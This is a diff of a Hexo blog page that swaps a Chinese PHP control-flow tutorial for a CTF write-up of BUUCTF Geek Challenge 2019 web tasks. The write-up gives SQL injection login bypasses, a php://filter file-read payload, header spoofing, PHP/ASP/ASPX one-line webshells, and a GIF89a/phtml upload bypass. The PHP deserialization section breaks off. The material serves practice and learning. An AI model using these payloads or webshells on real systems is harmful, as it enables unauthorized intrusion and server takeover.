@@ -4,9 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="PHP笔记 13 14 15 16, 一个Hexo博客">
+    <meta name="keywords" content="Buu[极客大挑战 2019], 一个Hexo博客">
     <meta name="description" content="
-回顾由于我之前更的文章为CSDN上的富本编译器（我的问题，那时候就没想这往GitHub上更）年前PHP的04到12，文字还能复制粘贴，图片不能，太多了，改了一两篇，实在是不想改了，但又要确定PHP笔记整体的完整性，链接奉上（改了下csdn">
+[极客大挑战 2019]EasySQL由题目可得做题方向
+永真表达式1admin&amp;#x27; or &amp;#x27;1&amp;#x27;=&amp;#x27;1
+注意：只需要密码维持此式即可解出
+使用万能账号也需判断，和永真表达式有什么区别的话，在页面进行">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +21,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>PHP笔记 13 14 15 16 | 一个Hexo博客</title>
+    <title>Buu[极客大挑战 2019] | 一个Hexo博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -310,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">PHP笔记 13 14 15 16</h1>
+                    <h1 class="description center-align post-title">Buu[极客大挑战 2019]</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +446,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-02-18
+                    2022-07-23
                 </div>
                 
 
@@ -465,26 +468,57 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <hr>
-<h1 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h1><p>由于我之前更的文章为CSDN上的富本编译器（我的问题，那时候就没想这往GitHub上更）<br>年前PHP的04到12，文字还能复制粘贴，图片不能，太多了，改了一两篇，实在是不想改了，但又要确定PHP笔记整体的完整性，链接奉上（改了下csdn的名，让这两个博客相关）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64702918/article/details/121733401?spm=1001.2014.3001.5501">php笔记 04</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64702918/article/details/121735021?spm=1001.2014.3001.5501">php笔记 05</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64702918/article/details/121777762?spm=1001.2014.3001.5501">php笔记 06</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64702918/article/details/122223101?spm=1001.2014.3001.5501">php笔记 07</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64702918/article/details/122245419?spm=1001.2014.3001.5501">php笔记 08 09 10 11 12</a></p>
-<p>流程控制：对PHP程序执行过程进行控制！<strong>共4种手段！</strong></p>
-<h1 id="顺序执行（从上往下执行）"><a href="#顺序执行（从上往下执行）" class="headerlink" title="顺序执行（从上往下执行）"></a>顺序执行（从上往下执行）</h1><h1 id="分支执行"><a href="#分支执行" class="headerlink" title="分支执行"></a>分支执行</h1><p>根据条件是否满足来选择执行某些代码，主要通过<strong>if，switch</strong>两种语句实现。</p>
-<h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p><strong>单项条件（if）</strong>，<strong>双项条件（if…else）</strong>，<strong>多向条件（if…elseif<br> …else）</strong>，均和C语言差不多！<br>注意：elseif直接写，之间没空格，可写多个。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>&gt;=<span class="variable">$pass</span>)&#123;</span><br><span class="line">	 <span class="keyword">echo</span><span class="string">&#x27;通过&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">其中&#123;&#125;之中为语句块。	我们<span class="keyword">if</span>语句的表达式中所控制的代码，最好用&#123;&#125;括起来，哪怕是一条语句也用！能减少错误的发生！  </span><br></pre></td></tr></table></figure>
-<h2 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a>switch 语句</h2><p><strong>switch…case…default(case可写多个)</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>（<span class="variable">$a</span>）&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">echo</span><span class="string">&#x27;输出1&lt;br /&gt;&#x27;</span>;<span class="keyword">break</span>；</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">echo</span><span class="string">&#x27;输出2&lt;br /&gt;&#x27;</span>;<span class="keyword">break</span>；</span><br><span class="line">	<span class="keyword">default</span>：</span><br><span class="line">		<span class="keyword">echo</span><span class="string">&#x27;输出末&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注意：<br>（1）表达式switch后面的值最好是整形，或者是字符串；<br>（2）每个case语句后面都加上break;<br>（3）如果某个case语句后面没有接语句块，那么就说明，这个语句块的内容是同下的（即输出的内容为下一个case的语句块），前提是这个case连break也没有；<br>（4）case后面的语句块不需要{}括起来；</p>
-</blockquote>
-<h1 id="循环执行（像C）"><a href="#循环执行（像C）" class="headerlink" title="循环执行（像C）"></a>循环执行（像C）</h1><h2 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span>&lt;<span class="number">10</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$i</span>++;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
-<p>先判断！在执行！</p>
-<h2 id="do…while语句"><a href="#do…while语句" class="headerlink" title="do…while语句"></a>do…while语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$i</span>++;</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$i</span>&lt;<span class="number">10</span>);	</span><br></pre></td></tr></table></figure>
-<p>先执行！后判断！<br>注意：与while语句区别是，do while语句至少会执行一次。</p>
-<h2 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(表达式a;表达式b;表达式c)&#123;</span><br><span class="line">	各种语句</span><br><span class="line">&#125;</span><br><span class="line">表达式a:会放一些初始化的语句，<span class="variable">$i</span>=<span class="number">0</span>,有也可以放多个表达式，中间用，隔开；</span><br><span class="line">表达式b:会放一些用来判断<span class="literal">true</span>或者<span class="literal">false</span>的表达式，有也可以放多个表达式，中间用，隔开；</span><br><span class="line">表达式c:会放一些初始化变量进行自增的语句，<span class="variable">$i</span>=<span class="number">0</span>,有也可以放多个表达式，中间用，隔开；</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="keyword">echo</span><span class="string">&quot;执行到第<span class="subst">&#123;$i&#125;</span>遍&lt;br /&gt;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="特殊的流程控制语句"><a href="#特殊的流程控制语句" class="headerlink" title="特殊的流程控制语句"></a>特殊的流程控制语句</h1><h2 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h2><p>默认用于终止当前中断语句（多用于终止循环语句）<br>在for循环嵌套中，可以在<strong>break 1（也可以是其他数），数字是几，就是跳出第几层循环语句。</strong><br><img src="https://img-blog.csdnimg.cn/3c4cdd35fa564096804e9ab5a3d94ba3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h2 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h2><p>跳出本次循环（例：<code>$i=3</code>），并不是结束整个循环语句<br><img src="https://img-blog.csdnimg.cn/9134f94d8ca84f70bb779990a88ee17b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>以图示为例，只是跳出<code>$i=5</code>时的这一次循环，其他正常输出。</p>
-<h2 id="exit-语句"><a href="#exit-语句" class="headerlink" title="exit()语句"></a>exit()语句</h2><p>结束当前整个PHP程序的执行，<br><img src="https://img-blog.csdnimg.cn/cca68b3459b34483aaf3ef146f53f3f4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_12,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>如图可在<code>exit()</code>括号添加文字…作为页面提示！</p>
-<h2 id="die-语句"><a href="#die-语句" class="headerlink" title="die()语句"></a>die()语句</h2><p>die()语句与 exit()语句用法和含义相同！</p>
+<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>由题目可得做题方向</p>
+<h2 id="永真表达式"><a href="#永真表达式" class="headerlink" title="永真表达式"></a>永真表达式</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/33de1a11c3ea42fdbab12050dce7fc23.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_10,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>注意：只需要密码维持此式即可解出</strong></p>
+<h2 id="使用万能账号"><a href="#使用万能账号" class="headerlink" title="使用万能账号"></a>使用万能账号</h2><p>也需判断，和永真表达式有什么区别的话，在页面进行输入的时候一个是要求用户名输入，一个是密码。（get与post时请输入全）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&#x27; or true # </span></span><br><span class="line"><span class="string">或 </span></span><br><span class="line"><span class="string">1’ or 1=1 # </span></span><br></pre></td></tr></table></figure>
+<p>密码随便输入即可<br><img src="https://img-blog.csdnimg.cn/218d04b73cf548b984d6c476bfe979ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_9,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h2 id="补"><a href="#补" class="headerlink" title="补"></a>补</h2><p>从<a target="_blank" rel="noopener" href="https://guizimo.blog.csdn.net/article/details/105887917?spm=1001.2101.3001.6650.19&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-19.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-19.pc_relevant_paycolumn_v3&utm_relevant_index=21">这里找到的表</a><br><img src="https://img-blog.csdnimg.cn/61006d93366a4888b1bbbe0982f14a35.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cbc7dbd6426648bc87087df27da1e922.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>🤔现在我们开始倒推（为什么是倒推，我看其他师傅的wp做出来的），为啥要用单引号进行输入，我们使用get方式（方便）进行判断！</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如<span class="string">&#x27;,&#x27;</span>),<span class="string">&#x27;&#x27;</span>)等</span><br></pre></td></tr></table></figure>
+<p>首先随便输入用户和密码，使url为图下模式<br><img src="https://img-blog.csdnimg.cn/4bb1a06dcf9a4c4d8da3f72ac4ff2f11.png" alt="在这里插入图片描述"><br>在用户名或密码处输入单引号界面异常，存在sql注入<br><img src="https://img-blog.csdnimg.cn/2e3e195b071a4d0d955ff2bfdd36fd4d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>即可通过改变url后得到flag（get）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span>admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>打开源码检查，有一部分php注释，应该有用<br><img src="https://img-blog.csdnimg.cn/8a47a279a6d8414181f099dfbea821f6.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">get</span>传入?cat<span class="operator">=</span>dog</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/ce016555c2bf42159c41a676ee946467.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>通过查看源码我们可得<code>/Archive_room.php</code><br><img src="https://img-blog.csdnimg.cn/08275e7e83b74ee7b2d9d4e388ca1e7b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>若直接点击，可得<br><img src="https://img-blog.csdnimg.cn/2e1a7c2c5e9e4e6694b0ff43d659fde0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>通过源代码可得<code>/action.php</code><br><img src="https://img-blog.csdnimg.cn/6b89aebae236466c9aa54d720f97e273.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>使用软件抓个包<br>    <img src="https://img-blog.csdnimg.cn/48b058621fb649c3a6763ed0ef310022.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现有个注释<code>secr3t.php</code>,get入url,<br><img src="https://img-blog.csdnimg.cn/61a4d3f10818461e8d6fd076f4564ab1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>根据提示<br><img src="https://img-blog.csdnimg.cn/f4aa56bcbd6f464dad793b2255713e86.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>嗯…不会了，从题目下手，可得<br><img src="https://img-blog.csdnimg.cn/21a17eb27cb943c58bd638ea5a09d65e.png" alt="在这里插入图片描述"><br>接着观察源代码<br><img src="https://img-blog.csdnimg.cn/9f2a24e578bb49ea80bd1fb152aefb6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>GET一个file参数过去，但是不能含有…/、tp、input、data，包括这些的大小写<br>现在需了解一个新概念：php://伪协议，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53142368/article/details/116594299">找到个学长博客</a><br><code>/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code>该伪协议读取源代码并进行base64编码输出<br>可得<img src="https://img-blog.csdnimg.cn/4add6369327d41088264a91ca922ce98.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d3c8aaf9a62541109a5616d2dc6b85d8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p><img src="https://img-blog.csdnimg.cn/acb5dde425804df6ab1205dc7bc7402c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可能与菜刀工具有关，软件又又又坏了，装软件去了，win11之后限权增加，用管理员方式打开就好了<br>添加数据！<br><img src="https://img-blog.csdnimg.cn/0debbe64828e42a2ba3a398fc7346bfd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_14,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/69ce5982934f4e4b9c60be73ee99e56a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YCfemrmlofnq6BbZGVdQnZ4aUU=,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>做完题，wp隔了一段时间，才更新，不错，都不记得了。</p>
+<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>首先用第一题的方法，都不对！<a target="_blank" rel="noopener" href="https://blog.csdn.net/satasun/article/details/106246493">找了个博客</a></p>
+<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>首页没思路，找源代码<br><img src="https://img-blog.csdnimg.cn/771c79850cda4a34888215f9f79fb80e.png" alt="在这里插入图片描述"><br>可点，点击后存在提示，它需要我们从<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn来访问它/">https://Sycsecret.buuoj.cn来访问它</a><br>所以要进行伪造来绕过了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer:https:<span class="comment">//Sycsecret.buuoj.cn</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/67cf0e61d44a4de78de0f0b4965607a6.png" alt="在这里插入图片描述"><br>它说要用Syclover browser,则修改User-Agent为Syclover browser<br><img src="https://img-blog.csdnimg.cn/0ed100c393144a1f8ce8f21e43be461d.png" alt="在这里插入图片描述">本地ip链接，X-Forwarded-For:127.0.0.1（一致）<br>注意：不要放最后。<br><img src="https://img-blog.csdnimg.cn/0210a3f7ed1d42f08190c76a1f7e7abb.png" alt="在这里插入图片描述"></p>
+<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>php的一句话木马： <?php @eval($_POST['pass']);?><br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;<br>这个题GIF的文件头绕过图片判断，GIF89a<br>顺手补了一下一句话木马的原理<br><img src="https://img-blog.csdnimg.cn/7be3e386e805429d92e3f832b952b4d1.png" alt="在这里插入图片描述"><br>嗯，，，，，，印象一般般，看题，<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55793759/article/details/120956861">借鉴文章</a></p>
+<p>随意上传一个，首先得到提示，不是图像<br><img src="https://img-blog.csdnimg.cn/30ae98f6fce14a2587e9a806f85b60d1.png" alt="在这里插入图片描述"><br>这里是phtml格式的，对.phtml文件的解释: 是一个嵌入了PHP脚本的html 页面。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a  <span class="comment">//习惯在文件前加上GIF89a来绕过PHP getimagesize的检查，</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a  <span class="comment">//习惯在文件前加上GIF89a来绕过PHP getimagesize的检查，这道题中有无皆可</span></span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[shell]);&lt;/script&gt;</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;system(<span class="string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>抓包，修改后缀，试到phtml可以（绕过后缀的有文件格式有php,php3,php4,php5,phtml.pht）<br>放包后可得提示<br><img src="https://img-blog.csdnimg.cn/4aa584e5915f4c52ac2c5313876d1280.png" alt="在这里插入图片描述"><br>图片的保存路径了，一般都是/upload查找含有的文件，访问，<br><img src="https://img-blog.csdnimg.cn/01bb2023a68d42079f1a74ee1b01cf21.png" alt="在这里插入图片描述"><br>找到上传文件名，打开即可<br><img src="https://img-blog.csdnimg.cn/538c417e503d4f078caaac1e44b4989f.png" alt="在这里插入图片描述"></p>
+<h1 id="极客大挑战-2019-PHP-1"><a href="#极客大挑战-2019-PHP-1" class="headerlink" title="[极客大挑战 2019]PHP 1"></a>[极客大挑战 2019]PHP 1</h1><p>不得不说，这个猫猫挺可爱的！<br><img src="https://img-blog.csdnimg.cn/ad3c3c41618b463f867cab5a213f5e9e.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/3bdca96abfa141efb2a330d3281c26eb.png" alt="在这里插入图片描述"><br>进网址，把压缩包下载下来<br><img src="https://img-blog.csdnimg.cn/92ea141345d84effbc881ee19258e8a9.png" alt="在这里插入图片描述"><br>flag.php中出现一个伪造flag<br>index.php，显示包含class.php文件，并且反序列化<br><img src="https://img-blog.csdnimg.cn/468705495eae46978c4ae6e9f7e884c6.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//将在反序列化之后立即调用</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__construct() <span class="comment">//当对象被创建即new之前，会触发进行初始化，但在unserialize()时是不会自动调用的。</span></span><br></pre></td></tr></table></figure>
+
